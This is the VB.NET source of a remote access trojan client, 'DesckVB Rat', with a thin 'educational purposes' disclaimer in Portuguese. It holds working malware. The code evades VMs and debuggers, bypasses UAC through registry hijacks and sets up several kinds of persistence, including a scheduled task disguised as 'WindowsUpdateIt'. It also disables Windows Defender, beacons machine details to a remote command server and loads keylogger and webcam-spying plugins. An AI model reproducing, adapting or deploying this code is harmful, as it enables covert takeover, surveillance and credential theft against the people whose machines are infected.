﻿
Imports System.IO 'File
Imports System.Net 'Web
Imports System.Reflection
Imports System.Text 'Txt
Imports System.Threading 'Thread and Task
Imports Microsoft.AmaisClass.Amais
Imports Microsoft.MySocketClass.MySocket
Imports Microsoft.Win32 'Regedit
Imports Microsoft.Alto_CopyClass.Alto_Copy
Imports Microsoft.Bypass_UACClass.Bypass_UAC

'!!!!!!!!!!!! Atenção codigo feito com propócito educativo !!!!!!!!!!!!!!
'!!!!!!!!!!!! Não me responsabiliso pelos seus atos !!!!!!!!!!!!!!!!!!!!!
'!!!!!!!!!!!! Apenas para proposito educativos "educacionais" '!!!!!!!!!!
'!!!!!!!!!!!! Use de forma correta perante a lei! Por favor !!!!!!!!!!!!!


'AForge .dll Webcam requered net Frameworck 4.8 ...

'Bypass UAC requered net Frameworck 4.8
'Bypass UAC win10 and win11
'Bypass UAC win8 and 8.1
'Bypass UAC win7

'Enbemding Dlls 
'Install-Package Costura.Fody -Version 1.6.2
'install-package costura.fody
'Webcam => Install-Package AForge.Video.DirectShow -Version 2.2.5
'Start webcam => http://www.aforgenet.com/framework/docs/html/090ae370-9400-4367-9cab-2f90ec21b45e.htm

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'Coded By Pjoao1578                                     '
'Update 06/03/2026                                      ' 
'Coded in Brasil                                        '
'Stub 32 and 64 bits                                    '
'Recomended net frameworck 4.8                          '
'Not recomended --> Make single instance application    '
'Stub Funcionali em win windows 10,11                   '
'Projecto Stub DesckVB Rat V2.9.0.0                     '
'Compativel com ngrok  https://ngrok.com/               '
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'IP DNS usage 127.0.0.1:7001,7002 pastecode txt

Namespace MicrosoftClass

    Public Class Microsoft

#Region "Variavel Global Base De Comandos"
        Public Shared xpegar() As String

        Public Shared ache As String = String.Empty
        Public Shared Porta As String = (7001)
        Public Shared Host As String = String.Empty
        Public Shared BecapHost As String = String.Empty
        Public Shared Password_conexao As String = String.Empty

        'varias Porta e Host
        Public Shared NovoHost As String = String.Empty
        Public Shared NovaPorta As String = String.Empty

        Public Shared NameParaIniciarComOWindows As String = String.Empty
        Public Shared ID As String = String.Empty
        Public Shared Metext As String = String.Empty
        Public Shared Sleep As Integer = 0
        Public Shared Alto_copy_server As String = String.Empty
        Public Shared Antikill As Boolean = False
        Public Shared Startup As Boolean = False
        Public Shared keyloger As Boolean = False
        Public Shared hidme As Boolean = False
        Public Shared Namer_Server As String = String.Empty
        Public Shared NomeStartup As String = String.Empty
        Public Shared LocalUser As Boolean = False
        Public Shared LocalMachine As Boolean = False
        Public Shared Winlogon As Boolean = False
        Public Shared Directorio As String = String.Empty
        Public Shared Pesistencia_server As Boolean = False
        Public Shared Crypt_Porta_host_true_false As Boolean
        Public Shared UACBypass As Boolean = False
        Public Shared Copyrun As String = String.Empty
        Public Shared Httpuser As String = String.Empty
        Public Shared Httppassword As String = String.Empty
        Public Shared Anti_VMware As Boolean = False
        Public Shared Anti_Debugger As Boolean = False
        Public Shared TaskSheduleAdd As Boolean = False
        Public Shared SiteblockMe As Boolean = False
        Public Shared SiteblockString As String = String.Empty 'sites de bloqueios
        Public Shared DefenderDisable As Boolean = False
#End Region

#Region "Variavel Global Funcions"
        Public Shared P_Startup As String = (Environment.GetFolderPath(Environment.SpecialFolder.Startup)) 'Startup
        Public Shared System32 As String = (Environment.GetFolderPath(Environment.SpecialFolder.System))   'System32
        Public Shared MyMutex As New Mutex(True, "D271F3C3-7AF6-4828-A079-6E1C823B4876") 'use defalt mutex
        Public Shared Mylocation As New FileInfo(Application.ExecutablePath)
        Public Shared Pais_do_computador_na_red As String = (Thread.CurrentThread.CurrentCulture.DisplayName) 'nome do pais ex( Brasil(Portugues) )
        Public Shared Hiden As FileAttribute = (FileAttribute.Hidden + FileAttribute.System + FileAttributes.ReadOnly) 'hide + system + ReadOnly
        Public Shared Vercion As String = (My.Application.Info.Version.ToString) 'vercion info
        Public Shared Separador As String = ("||") 'Separador Conexão tcp
        Public Shared Local_arquivo As String = (String.Empty) 'copy post cut / file manager
#End Region

#Region "Endpp or restart app"
        Public Shared Sub Endpp()
            'Encerra apenas o loop de mensagens da thread atual.
            Try
                Call Application.ExitThread()
            Catch ex As Exception
            End Try
            End
        End Sub

        Public Shared Sub EndppRestart()
            Call Thread.Sleep(5000)
            Process.Start(Mylocation.FullName).Dispose()
            Call Endpp()
        End Sub
#End Region

#Region "PC_Desligar_Sair_logoff"

        Public Shared Sub PC_Desligar_Sair_logoff() 'Quando o windows desligar, reiniciar, logoff.
            Try
                Dim logs As String = (Path.GetTempPath & "\Logs.txt").ToString
                If (File.Exists(logs)) Then
                    Call File.Delete(logs)
                End If
                Call EscreverOuCriar(logs, (TimeOfDay & " " & Today).ToString, Encoding.GetEncoding(858), False)
            Catch ex As Exception
            End Try

            Call Endpp() 'finalizar tudo
        End Sub
#End Region

#Region "AntiVmware"
        Public Shared Sub AntiVmware()
            Try
                Dim List() As String = {"vmtoolsd".ToLower, "vboxservice".ToLower,
                   "Vmwareuser".ToLower, "Vmwaretrat".ToLower, "prl_cc".ToLower,
                   "joeboxserver".ToLower, "vboxservice".ToLower, "Hyper-V",
                   "WindowsAzureGuestAgent".ToLower, "azurearcsystray".ToLower,
                   "Servermanager".ToLower, "rdpclip".ToLower, "joeboxserver".ToLower}

                For Each x As Process In Process.GetProcesses
                    Dim P As String = x.ProcessName.ToLower

                    Select Case P
                        Case List.Contains(P)
                            Call Endpp() 'close me all
                    End Select

                Next x
            Catch ex As Exception
            End Try
        End Sub

#End Region

#Region "AntiDebug"
        Public Shared Sub AntiDebug()
            Try
                Dim Resultado As Boolean = Debugger.IsAttached
                If (Resultado) Then
                    Call Endpp()
                End If
            Catch ex As Exception
            End Try
        End Sub

#End Region

#Region "Sub Main"

        Public Shared Sub Start()
            Try
                'https://docs.microsoft.com/pt-br/dotnet/api/system.diagnostics.processpriorityclass?view=netframework-4.8
                '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
                'Priority alto, vai força o processador trabalhar mais com o applicativo.
                Dim AltoDesenpenho As Process = Process.GetCurrentProcess
                AltoDesenpenho.PriorityClass = ProcessPriorityClass.High

                Dim T_Priority As Thread = Thread.CurrentThread
                T_Priority.Priority = ThreadPriority.Highest
                '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

                Control.CheckForIllegalCrossThreadCalls = False 'trabalhar com thereds

                'protocolo .net para downloads
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

                'events add
                AddHandler SystemEvents.SessionEnding, AddressOf PC_Desligar_Sair_logoff

                xpegar = Split(ache, "#JP#") 'set dados

                Porta = xpegar(1)
                Host = xpegar(2)
                BecapHost = xpegar(2)
                NameParaIniciarComOWindows = xpegar(3)
                ID = xpegar(4)
                Metext = xpegar(5)
                Sleep = CType(xpegar(6), Integer)
                Alto_copy_server = xpegar(7)
                Antikill = CType(xpegar(8), Boolean)
                Startup = CType(xpegar(9), Boolean)
                LocalMachine = CType(xpegar(10), Boolean)
                keyloger = CType(xpegar(11), Boolean)
                LocalUser = CType(xpegar(12), Boolean)
                hidme = CType(xpegar(13), Boolean)
                Namer_Server = xpegar(14)
                NomeStartup = xpegar(15)
                Winlogon = CType(xpegar(16), Boolean)
                Directorio = xpegar(17)
                Pesistencia_server = CType(xpegar(18), Boolean)
                Crypt_Porta_host_true_false = CType(xpegar(19), Boolean)
                Password_conexao = xpegar(20)
                UACBypass = CType(xpegar(21), Boolean)
                Copyrun = xpegar(22)
                Try
                    If xpegar(23) IsNot Nothing And xpegar(24) IsNot Nothing Then
                        Httpuser = xpegar(23)
                        Httppassword = xpegar(24)
                    End If
                Catch ex As Exception
                End Try
                Anti_VMware = CType(xpegar(25), Boolean)
                Anti_Debugger = CType(xpegar(26), Boolean)
                TaskSheduleAdd = CType(xpegar(27), Boolean)
                SiteblockMe = CType(xpegar(28), Boolean)
                If SiteblockMe Then
                    SiteblockString = xpegar(29)
                End If
                DefenderDisable = CType(xpegar(30), Boolean)
                If CType(xpegar(31), Boolean) Then 'mutex randon
                    MyMutex = New Mutex(True, xpegar(32))
                End If
            Catch ex As Exception
                Call Endpp()
                Exit Sub
            End Try

            Try
                If (MyMutex.WaitOne(0, True).Equals(False)) Then
                    Call Endpp()
                    Exit Sub
                End If
            Catch ex As Exception
            End Try

            Try
                If (Anti_VMware) Then 'Anti virtual pc, detect process.
                    Call AntiVmware()
                End If
            Catch ex As Exception
            End Try

            Try
                'Sleep
                If (Sleep > 0) Then
                    For x As Integer = 0 To CType(Sleep - 1, Integer)
                        Call Application.DoEvents()
                        Call Thread.Sleep(1000)
                    Next x
                End If
            Catch ex As Exception
            End Try

            Try 'Anti_Debugger
                If (Anti_Debugger) Then
                    Call AntiDebug()
                End If
            Catch ex As Exception
            End Try

            Try
                If (UACBypass) Then 'UAC bypass win 7,8,10,11
                    If (IsAdmin()) Then
                        '''''''sucess Admin'''''''''

                        'remove key win,7,8 
                        Shell(DirUAC & "REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\Shell\Open\command /t REG_SZ /f /d """, AppWinStyle.Hide)
                        'remove key win,10,11
                        Shell(DirUAC & "REG ADD HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command /t REG_SZ /f /d """, AppWinStyle.Hide)
                        'remove key
                        Shell(DirUAC & "REG delete HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command /f /v DelegateExecute", AppWinStyle.Hide)
                    Else
                        Dim win As String = My.Computer.Info.OSFullName
                        Select Case True
                            Case win.Contains("10"), win.Contains("11")
                                Call win10_11UACbypass(Mylocation.FullName)
                            Case win.Contains("8"), win.Contains("7")
                                Call win7_Win8_UACbypass(Mylocation.FullName)
                        End Select
                        Call Endpp()
                        Exit Sub
                    End If

                End If
            Catch ex As Exception
            End Try

            Try 'Copy file to folder
                Dim c_ser As String = Alto_copy_server
                Dim D As String = String.Empty

                Select Case True
                    Case String.IsNullOrWhiteSpace(c_ser)
                        Exit Try
                    Case c_ser.Equals("AppData")
                        D = (Environ("appdata") & "\" & Directorio).ToString
                    Case c_ser.Equals("Programs")
                        D = (Environment.GetFolderPath(Environment.SpecialFolder.Programs) &
                        "\" & Directorio).ToString
                End Select

                If (Mylocation.DirectoryName.Equals(D).Equals(False)) Then 'check file folder
                    Call Copy_Dir(D, Copyrun) 'copy server to folder
                    Exit Sub
                End If
            Catch ex As Exception
                Call Endpp()
                Exit Sub
            End Try

            'Descryptar Host porta
            Try
                If (Crypt_Porta_host_true_false) Then 'crypted my host my porta true
                    Dim HostDescrypted As String = BaseSplit(Host)
                    BecapHost = HostDescrypted
                    Host = HostDescrypted
                    Porta = BaseSplit(Porta)
                End If
            Catch ex As Exception
                Call Endpp()
                Exit Sub
            End Try

            'Conexão start
            Call ConectVerifique() 'verificar e conecta

            Try
                If (Pesistencia_server) Then 'pecistencia
                    Call All_Pesistencia() 'copy all and pesisten checked
                    Call Pesistencia_My_Server() 'start percistencia com tempo
                Else
                    Call All_Pesistencia() 'inicia apenas com windows caso tenha cido marcado, e se pecistencia nao foi marcado.
                End If
            Catch ex As Exception
            End Try

            Call Application.Run()
        End Sub
#End Region

#Region "ConectVerifique (Download host or not)"

        Public Shared Sub ConectVerifique()
            Try
                Dim T As New Thread(New ThreadStart(Sub()
                                                        If (Host.ToLower.Contains("http".ToLower)) Then
                                                            Call Conect_My_Server_Download()
                                                        Else
                                                            Call Conect_my_server(Host, CType(Porta, Integer))
                                                        End If
                                                    End Sub))
                Call T.SetApartmentState(ApartmentState.STA)
                T.IsBackground = False
                Call T.Start()
            Catch ex As Exception
                Call EndppRestart()
            End Try
        End Sub

        Public Shared Sub Conect_My_Server_Download()
            Try

                Call Thread.Sleep(5000) 'usado para nao bugar o client

                Dim x As New WebClient

                With x
                    .Encoding = Encoding.UTF8
                    .Proxy = Nothing
                    .Headers.Add(HttpRequestHeader.CacheControl, "no-cache")
                    .Headers.Add(HttpRequestHeader.Pragma, "no-cache")
                End With

                'usege pass and username http ftp
                If String.IsNullOrWhiteSpace(Httpuser.Trim).Equals(False) And
                String.IsNullOrWhiteSpace(Httppassword.Trim).Equals(False) Then

                    x.Credentials = New NetworkCredential(Httpuser.Trim, Httppassword.Trim)
                End If

                Dim S_Host As String = x.DownloadString(New Uri(Host.Trim)).Trim 'download ip, host and save

                'dispose close
                Call x.Dispose()
                x = Nothing

                If String.IsNullOrWhiteSpace(S_Host).Equals(False) Then
                    'start
                    Call Conect_my_server(S_Host, CType(Porta, Integer))
                Else
                    Call EndppRestart()
                End If

            Catch ex As Exception
                Call EndppRestart()
            End Try
        End Sub

        Private Shared Portas As Integer = 0

        Public Shared Sub Conect_my_server(ByVal H As String, ByVal P As Integer)

            'detected ports in string ip
            'ex 127.0.0.1:7001,
            'ex 127.0.0.1:7001,1000,2000,

            Try
                Call Thread.Sleep(5000) 'usado para nao bugar o client

                If (H.Contains(",") And H.Contains(":")) Then

                    Dim RemoveIp() As String = Split(H, ":")
                    Dim HPegar() As String = Split(RemoveIp(1), ",")
                    Dim T As Integer = CType(HPegar.Count - 1, Integer)

                    'set porta list
                    P = CType(HPegar(Portas).Trim, Integer) 'pegar a porta 0,,

                    'Verificar set, check se tem mais de uma porta
                    If Portas.Equals(T) Then
                        Portas = 0 'nao tem mais portas! porta unica.
                    ElseIf T > 1 Then
                        Portas += 1 'sim tem mais portas ,,,
                    End If
                    Host = H
                    NovoHost = RemoveIp(0).Trim 'host, ip
                Else
                    'unica porta e unico host
                    NovoHost = Host
                    Host = H
                End If
            Catch ex As Exception
                Portas = 0 'set porta
                Call EndppRestart()
            End Try

            If String.IsNullOrWhiteSpace(H).Equals(False) And (P > 200) Then
                'save porta start
                NovaPorta = P

                'start
                Dim T As New Thread(New ThreadStart(Sub()
                                                        Call Connect(NovoHost, P)
                                                    End Sub))
                Call T.SetApartmentState(ApartmentState.STA)
                T.IsBackground = False
                Call T.Start()
            Else
                Call EndppRestart()
            End If

        End Sub
#End Region

#Region "Conected Send"
        Public Shared Sub Conected()

            Dim Base As String = String.Empty
            Base &= ("info") '0
            Base &= (Separador & ID) '1
            Base &= (Separador & Environment.MachineName) '2
            Base &= (Separador & Environment.UserName) '3
            Base &= (Separador & Pais_do_computador_na_red) '4

            Try
                Base &= (Separador & My.Computer.Info.OSFullName) '5
            Catch ex As Exception
                Base &= (Separador & "Unknown OS") '5
            End Try

            Base &= (Separador & Bits()) '6
            Base &= (Separador & "Aguarde") '7 AV Detect
            Base &= (Separador & Vercion) '8
            Base &= (Separador & RAM()) '9
            Base &= (Separador & Data_de_estalasao()) '10
            Base &= (Separador & "Aguarde") '11 webcam
            Base &= (Separador & Password_conexao) '12
            Base &= (Separador & (IP_Remoto() & "/" & IP_Local()).ToString) '13
            Base &= (Separador & "...") '14 ping net work
            Base &= (Separador & SiteblockString) '15 todos os sites que vao ser ploqueados
            Base &= (Separador & keyloger.ToString) '16 keyloger run or not
            Base &= (Separador)

            Send(Base)
        End Sub
#End Region

#Region "Disconected"

        Public Shared Sub Disconected()

            Call StopDlls() 'stop all blugins

            'Verificar
            If String.IsNullOrWhiteSpace(BecapHost) Or String.IsNullOrWhiteSpace(Porta) Or
            String.IsNullOrWhiteSpace(Host) Or String.IsNullOrWhiteSpace(Password_conexao) Then

                Call EndppRestart()
                Exit Sub
            End If

            'Conexão
            If String.IsNullOrWhiteSpace(BecapHost).Equals(False) Then
                Host = BecapHost
            End If

            'new Conect
            If String.IsNullOrWhiteSpace(Host).Equals(False) And
             String.IsNullOrWhiteSpace(Porta).Equals(False) And
             String.IsNullOrWhiteSpace(BecapHost).Equals(False) Then

                Call ConectVerifique()
            Else
                Call EndppRestart()
            End If
        End Sub
#End Region

#Region "Pesistencia"

        Public Shared Sub Pesistencia_My_Server()
            If Startup.Equals(False) And LocalUser.Equals(False) And LocalMachine.Equals(False) And
           Winlogon.Equals(False) And hidme.Equals(False) And TaskSheduleAdd.Equals(False) And
           SiteblockMe.Equals(False) And DefenderDisable.Equals(False) And Antikill.Equals(False) And
           Anti_Debugger.Equals(False) Then

                Exit Sub
            End If

            Task.Run(Async Function()
                         Do While True
                             Await Task.Delay((62 * 1000)) '1 min y 2 seg...
                             Call All_Pesistencia()
                         Loop
                     End Function)
        End Sub
#End Region

#Region "Iniciar Com o windows + All_Pesistencia"
        Public Shared Sub All_Pesistencia()
            Try
                Try 'Anti_Vmware
                    If (Anti_VMware) Then
                        Call AntiVmware()
                    End If
                Catch ex As Exception
                End Try

                Try 'Anti_Debugger
                    If (Anti_Debugger) Then
                        Call AntiDebug()
                    End If
                Catch ex As Exception
                End Try

                If (Startup) Then 'copy file to Startup
                    Dim Pasta As String = (P_Startup & "\" & NomeStartup).ToLower
                    Dim Codigo As String = String.Empty 'codigo escrito

                    'Delet exist
                    If File.Exists(Pasta) Then
                        Call File.Delete(Pasta)
                    End If

                    'copy file startup
                    Dim check() As String = {".vbs", ".bat", ".exe", ".ink", "powershell copy"}
                    Select Case True
                        Case check.Contains(".vbs")
                            Codigo &= "On Error Resume Next" & vbCrLf
                            Codigo &= "Dim x" & vbCrLf
                            Codigo &= "Set x = CreateObject(""Wscript.Shell"")" & vbCrLf
                            Codigo &= "x.run(""""""" & Mylocation.FullName & """""""),0"
                            Call EscreverOuCriar(Pasta, Codigo, Encoding.Default, True) 'criar file vbs
                        Case check.Contains(".bat")
                            'codigo bat cmd
                            Codigo &= (System32 & "\cmd.exe /c start " & """" & """" & " /d " & """" & Mylocation.DirectoryName & """" & " " & """" & Mylocation.Name & """").ToString
                            Call EscreverOuCriar(Pasta, Codigo, Encoding.Default, True) 'criar file bat
                        Case check.Contains(".exe")
                            Call File.Copy(Mylocation.FullName, Pasta)
                            Call File.SetAttributes(Pasta, FileAttributes.Normal)
                        Case check.Contains(".ink")
                            Dim oShell As Object = CreateObject("WScript.Shell")
                            Dim oLink As Object = oShell.CreateShortcut(Pasta.ToLower.Replace(".exe", String.Empty) & ".lnk")
                            With oLink
                                .TargetPath = Mylocation.FullName
                                .WindowStyle = 1
                                .IconLocation = (Mylocation.FullName & ", 0")
                                .Save()
                            End With
                            'dispose
                            oShell = Nothing
                            oLink = Nothing

                        Case check.Contains("powershell copy")
                            Cmd(Environ("systemroot"), "powershell.exe",
                                  "-nologo -windowstyle hidden [System.IO.File]::Copy('" &
                                  Mylocation.FullName & "' , '" &
                                  Pasta.Replace("powershell copy", ".exe") & "')", True)
                    End Select
                End If
            Catch ex As Exception
            End Try

            Try
                If (hidme) Then 'hide server
                    Call File.SetAttributes(Mylocation.FullName, FileAttribute.Hidden)

                    If Startup Then 'hide executavel em Startup
                        Dim Pasta As String = (P_Startup & "\" & NomeStartup).ToString
                        If File.Exists(Pasta) Then
                            Call File.SetAttributes(Pasta, FileAttribute.Normal)
                        End If
                    End If
                End If
            Catch ex As Exception
            End Try

            Try 'CurrentUser add
                If (LocalUser) Then
                    Call ADDWindowsRunOrDelete(NameParaIniciarComOWindows, "software\microsoft\windows\currentversion\run", """" & Mylocation.FullName & """", True, True) 'true user,false machine
                End If
            Catch ex As Exception
            End Try

            Try 'LocalMachine add
                If (LocalMachine) Then 'requer admin mode
                    Call ADDWindowsRunOrDelete(NameParaIniciarComOWindows, "software\microsoft\windows\currentversion\run", """" & Mylocation.FullName & """", False, True) 'true user,false machine
                End If
            Catch ex As Exception
            End Try

            Try 'Winlogon add
                If (Winlogon) Then
                    'not edit Explorer.exe
                    Call ADDWindowsRunOrDelete("shell", "Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", "Explorer.exe," & """" & Mylocation.FullName & """", True, True) 'true user,false machine
                End If
            Catch ex As Exception
            End Try

            Try 'TaskSheduleAdd
                If (TaskSheduleAdd) Then 'requer admin mode
                    Shell(System32 & "\" &
                "schtasks.exe /create /tn """ & NameParaIniciarComOWindows &
                """ /tr " & """" & Mylocation.FullName & """" & " /sc onstart /f", AppWinStyle.Hide)
                End If
            Catch ex As Exception
            End Try

            Try 'Reiniciar se fechado
                If (Antikill) Then
                    AddHandler Process.GetCurrentProcess.Exited, AddressOf NoKit 'use shell restart
                    AddHandler AppDomain.CurrentDomain.ProcessExit, AddressOf NoKit 'use shell restart
                    Call Reiniciar_sefechado() 'TaskShedule
                End If
            Catch ex As Exception
            End Try

            Try 'requered admin mode sites block
                If (SiteblockMe) Then
                    Task.Run((Sub()
                                  Call SiteBlock(SiteblockString)
                              End Sub))
                End If
            Catch ex As Exception
                Send("erro" & Separador & ex.ToString)
                SiteblockMe = False
            End Try

            Try 'requered admin mode
                If (DefenderDisable) Then 'disable windows defender antivirus
                    Dim x As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Policies\Microsoft\Windows Defender", True)
                    Call x.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord)
                    Call x.Close()
                    Call x.Dispose()
                    x = Nothing
                End If
            Catch ex As Exception
            End Try
        End Sub

        Private Shared Sub NoKit()
            Shell("cmd.exe /c ping 127.0.0.1 & start """ & Mylocation.FullName & """", AppWinStyle.Hide)
        End Sub

        Private Shared Sub Reiniciar_sefechado()
            'Artigo powershell => https://www.purainfo.com.br/windows/operadores-de-comparacao-powershell/
            'Artigo 1 https://docs.microsoft.com/en-us/windows/desktop/taskschd/schtasks
            'Artigo 2 https://support.microsoft.com/en-us/help/823093/a-scheduled-task-does-not-run-when-you-use-schtasks-exe-to-create-it-a

            'Reiniciar se fechado, ha cada 1 min. TaskShedule
            Shell(System32 & "\schtasks.exe /create /tn WindowsUpdateIt /tr " &
        ("""" & "\" & """" & Mylocation.FullName & "\" & """" & " " & """" & " /sc minute /f"), AppWinStyle.Hide)
        End Sub
#End Region

#Region "Blugins object StopDlls"
        Public Shared BlugWebcam As Object = Nothing
        Public Shared Verificar_Palavras As Object = Nothing
        Public Shared Keylogger As Object = Nothing

        Public Shared Sub KeyloggerStop()
            If (Keylogger IsNot Nothing) Then
                Try
                    Dim Retorno As Boolean = CType(Keylogger.StopAll, Boolean) 'cancela tudo e feixa a conexao
                Catch ex As Exception
                End Try
                Keylogger = Nothing
            End If
        End Sub

        Public Shared Sub Verificar_PalavrasStop()
            If (Verificar_Palavras IsNot Nothing) Then
                Try
                    Call Verificar_Palavras.Cancell()
                Catch ex As Exception
                End Try
                Verificar_Palavras = Nothing
            End If
        End Sub

        Public Shared Sub StopDlls()
            If (BlugWebcam IsNot Nothing) Then
                Try
                    Call BlugWebcam.Cancell()
                Catch ex As Exception
                End Try
                BlugWebcam = Nothing
            End If

            Call KeyloggerStop()
            Call Verificar_PalavrasStop()
        End Sub
#End Region

#Region "Data"

        Public Shared Async Sub Data(B() As Byte)
            Dim Pegar As String() = Nothing

            Try
                Pegar = Split(GetS(B), Separador)
            Catch ex As Exception
                Exit Sub
            End Try

            Select Case Pegar(0)

                Case "PalavrasStop"
                    Try
                        If (Verificar_Palavras IsNot Nothing) Then
                            Call Verificar_Palavras.Cancell()
                            Verificar_Palavras = Nothing
                        End If
                    Catch ex As Exception
                    End Try

           'open forms to rat
                Case "OpenAllForms"
                    Send(Pegar(1))

                Case "RunBlugin"

                    Await Task.Run((Sub()
                                        Try
                                            Dim ProjectName As String = Pegar(5)
                                            'Dim Classname As String = Pegar(2)
                                            Dim Namerunobject As String = Pegar(3)
                                            Dim Msg As Boolean = CType(Pegar(6), Boolean)
                                            'Dim Executeobject As Object = Nothing
                                            Dim ArgumentObject As String = Pegar(4)
                                            Dim Argument As New List(Of Object)

                                            Dim HD As String = (Host & "%%" & Porta)
                                            Dim Dll As Object = DLLInvoke(Pegar(1))

                                            If String.IsNullOrWhiteSpace(ArgumentObject) Then
                                            Else
                                                Dim D() As String = Split(ArgumentObject, ",,")
                                                For x As Integer = 0 To (D.Count - 1)
                                                    Call Argument.Add(D(x))
                                                Next x
                                            End If

                                            If ArgumentObject.Contains("PortaHoste") Then
                                                Call Argument.Add(HD)
                                            End If
                                            If ArgumentObject.Contains("meme") Then
                                                Call Argument.Add(New Microsoft)
                                            End If

                                            Select Case ProjectName
                                                Case "Keylogger"

                                                    Select Case (Keylogger Is Nothing)
                                                        Case True
                                                            Keylogger = Dll
                                                        Case False
                                                            Dim open As Boolean = CType(Keylogger.OpenForm(), Boolean) 'check and show form
                                                            Select Case False
                                                                Case open
                                                                    Call KeyloggerStop()
                                                            End Select
                                                    End Select

                                                Case "Webcam"
                                                    If (BlugWebcam Is Nothing) Then
                                                        BlugWebcam = Dll
                                                    End If

                                                Case "Verificar_Palavras"
                                                    If (Verificar_Palavras IsNot Nothing) Then
                                                        Exit Sub
                                                    End If
                                                    Verificar_Palavras = Dll

                                            End Select

                                            If (Msg.Equals(False)) Then
                                                Call Argument.Add(TClient)
                                            End If

                                            Dll.GetType.GetMethod(Namerunobject).Invoke(Nothing, Argument.ToArray)

                                            If (Msg) Then
                                                Send("sucess" & Separador)
                                            End If
                                        Catch ex As Exception
                                            Send("Sucess" & Separador & "Me" &
                                                  Separador & ("Blugin erro: " & ex.ToString))
                                        End Try
                                    End Sub))

                Case "Webcam_Open"
                    Try
                        If (BlugWebcam IsNot Nothing) Then
                            BlugWebcam.SendX(Pegar(1) & Separador & BlugWebcam.SockID.ToString)
                        End If
                    Catch ex As Exception
                    End Try

                Case "restartserver"
                    Call EndppRestart()

                Case "closeserver"

                    Try
                        If (Antikill) Then 'deletar pessistencia task
                            Shell(System32 & "\schtasks.exe /delete /tn WindowsUpdateIt /f", AppWinStyle.Hide)
                        End If
                    Catch ex As Exception
                    End Try

                    Call Endpp()'fechar tudo

                Case "Uninstall"
                    Call UnistalServidor()
            End Select
        End Sub

        Public Shared Sub UnistalServidor()
            Try
                If (Startup) Then 'copy file to Startup
                    Dim Pasta As String = (P_Startup & "\" & NomeStartup).ToString
                    If File.Exists(Pasta) Then
                        Call File.SetAttributes(Pasta, FileAttributes.Normal)
                        Call File.Delete(Pasta)
                    End If
                End If
            Catch ex As Exception
            End Try

            Try
                If (LocalUser) Then 'deletar server em CurrentUser
                    Call ADDWindowsRunOrDelete(NameParaIniciarComOWindows, "software\microsoft\windows\currentversion\run", String.Empty, False, True) 'True se for na user,false machine 
                End If
            Catch ex As Exception
            End Try

            Try
                If (LocalMachine) Then 'deletar server em LocalMachine
                    Call ADDWindowsRunOrDelete(NameParaIniciarComOWindows, "software\microsoft\windows\currentversion\run", String.Empty, False, False) 'True se for na user,false machine 
                End If
            Catch ex As Exception
            End Try

            Try
                If (Winlogon) Then 'restore Explorer
                    Call ADDWindowsRunOrDelete("shell", "Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", "Explorer.exe", True, True) 'true user,false machine
                End If
            Catch ex As Exception
            End Try

            Try
                If (TaskSheduleAdd) Then
                    'delete key TaskShedule
                    Shell(System32 & "\schtasks.exe /delete /tn " &
                      NameParaIniciarComOWindows & " /f", AppWinStyle.Hide)
                End If
            Catch ex As Exception
            End Try

            Try 'delete server apos desistalado + hide cmd + exit cmd
                Call File.SetAttributes(Mylocation.FullName, FileAttribute.Normal)
                Shell(System32 & "\cmd.exe /c ping 127.0.0.1 -n 5 & cd " &
            """" & Mylocation.DirectoryName & """ & del /f """ & Mylocation.Name & """", AppWinStyle.Hide)
            Catch ex As Exception
            End Try

            Try
                Dim logs As String = (Path.GetTempPath & "\Logs.txt").ToString
                If (File.Exists(logs)) Then
                    Dim F As New FileInfo(logs)
                    Call File.SetAttributes(logs, FileAttributes.Normal)
                    Shell(System32 & "\cmd.exe /c ping 127.0.0.1 -n 5 & cd " &
                """" & F.DirectoryName & """ & del /f """ & F.Name & """", AppWinStyle.Hide)
                End If
            Catch ex As Exception
            End Try

            Try
                If (Antikill) Then 'fecha pescistencia //reiniciar se fechado op: copia se aberto novamente
                    Shell(System32 & "\schtasks.exe /delete /tn WindowsUpdateIt /f", AppWinStyle.Hide)
                End If
            Catch ex As Exception
            End Try

            Call Endpp() 'finalizar tudo depois que for tudo removido do pc do infectado
        End Sub

#End Region


    End Class

End Namespace